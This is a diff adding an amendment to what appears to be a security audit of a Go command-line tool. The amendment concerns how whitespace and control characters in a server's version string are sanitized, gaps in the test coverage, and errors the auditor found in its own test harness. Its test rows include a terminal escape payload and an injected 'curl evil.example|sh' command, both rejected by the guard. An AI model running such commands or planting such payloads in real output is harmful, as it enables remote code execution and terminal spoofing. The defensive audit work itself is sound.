@@ -1220,3 +1220,87 @@ token list 1/1   repo list 1/1   whoami 1/1                        <- not exempt
 The reviewer states it read §13 before finishing and **did not use 6b as an instrument** —
 so its N-4 is a genuinely independent derivation of the `compactText`/`…` mechanism rather
 than an echo of the amendment. Three agents, three routes, same mechanism.
+
+---
+
+## 17. AMENDMENT 12 — audit addendum. ONE LOW finding, and a correction to §13's framing.
+
+### 🔴 THE SEPARATOR HALF OF THE TRIM CLASS IS UNPINNED — the whole suite passes with the guard removed
+
+**The compound-predicate shape**, and the best finding of the audit round. The class splits by
+*which mechanism handles it*, and the shipped table covers only one side:
+
+- **tab / LF / VT / FF / CR / U+0085** are `unicode.IsControl` → `sanitizeTTY` strips them
+  **independently of any trimming**.
+- **U+00A0, U+1680, U+2000-200A, U+2028, U+2029, U+202F, U+205F, U+3000** are **Zs/Zl/Zp —
+  neither `IsControl` nor `Cf`** — so `sanitizeTTY` does not touch them. They are handled
+  **only** by `TrimSpace`.
+
+And `TrimSpace` appears **twice** — `compactText` (`run.go:1007`) and `cellText`'s closing
+`return` — each individually sufficient, so **neither is observable**. Removing one: suite
+green. Removing **both**:
+
+```
+TESTS_EXIT=0          <- THE ENTIRE SUITE STAYS GREEN
+ls    -> SURVIVED: U+2028 (LINE SEPARATOR reaches stderr)
+ps    -> SURVIVED: U+2029      nbsp -> SURVIVED: U+00A0      ideo -> SURVIVED: U+3000
+cr    -> clean        <- sanitizeTTY covers it by a DIFFERENT mechanism
+```
+
+**The `cr` row is why the table cannot see this.** Every row in
+`TestSkewWarningSanitizesTheServerString` (tab, CR, LF) is *also* covered by `sanitizeTTY`,
+so all three stay green with the trimming guard entirely gone. **The rows that would
+discriminate are exactly the ones absent.**
+
+**Impact today: none** — the code is correct. The finding is the *unpinnedness*: nothing
+would tell you if it stopped being true, and the test's "exactly one line" assertion splits
+on `\n`, so a surviving U+2028 would not trip it. **Fix is one row:**
+`{"trailing line separator", "0.14.0 ", true}`.
+
+### CORRECTION to §13 — "a second bypass class, LARGER than the size class" overstated the severity
+
+§13 (mine) said the trim class is *"larger than the size class, and it contains the sharpest
+payload in the audit."* The auditor enumerated the **whole** class rather than sampling it —
+every `unicode.IsSpace` fast-path codepoint plus the full `White_Space` property, 16 members
+with per-row `curl` controls — and the refinement matters:
+
+```
+bm_ok    "0.14.0+g1a2b3c4"                    warned=True    <- positive control
+bm_esc   "0.14.0+<ESC>[2Jowned"               warned=False   <- guard rejects
+bm_semi  "0.14.0+; run curl evil.example|sh"  warned=False   <- guard rejects
+```
+
+`x/mod/semver` enforces SemVer's `[0-9A-Za-z-]` on build metadata, so the guard-passing set
+is exactly **{valid semver decorated with whitespace}**. **Larger in cardinality (16 vs 1),
+strictly WEAKER in capacity: it can inject spacing, never a sentence.** `0.14.0\r` was the
+sharpest payload precisely because `\r` is the one member with a cursor effect — and it is
+stripped. My framing implied a broader capability than exists.
+
+**And the mechanism is better than the test table suggests:** `compactText` opens with
+`sanitizeTTY(strings.TrimSpace(s))`, so `cellText` trims **exactly the same class**
+`normSemver` trims. The sanitizer and the guard agree **by construction, not by
+coincidence** — anything the semver check becomes blind to is, by the same predicate,
+already gone from the printed string.
+
+Full enumeration at the tip: all 16 members warn, all 245 bytes, **zero payload characters
+in stderr**. The class is fully closed in shipped code.
+
+### The 4-vs-5 count, reconciled by the auditor independently
+
+It re-ran Mutation A at the code tip and got **5**, against its own **4** at `ea71a367` —
+because `f2f778d6` added the `unbounded build metadata` row to that table. Matches §14's
+record exactly. Each number is right for its own SHA.
+
+### Two instrument failures the auditor caught in its OWN harness, both reported
+
+1. **A uniform result across all 21 cells.** It selected the payload via `UZI_URL=".../?m=$m"`,
+   but the client builds `TrimRight(base,"/") + "/api/version"`, so the query landed mid-URL
+   and the server never matched. Every cell returned `warned=False … clean` — **which reads
+   exactly like "the whole class is rejected by the guard", a plausible and wrong
+   conclusion.** Caught by the uniform-result rule rather than by suspicion: `bm_ok` is
+   unambiguously valid semver and must warn, and it did not.
+2. Two rows read wrong on a 0.9s server start; a 1.5s wait plus a per-row `curl` control
+   fixed both. Same startup race that made a `utf8cut` row read 8 bytes in its first report.
+
+**Neither changed a conclusion, because both were caught before the write-up.** Both would
+have otherwise.
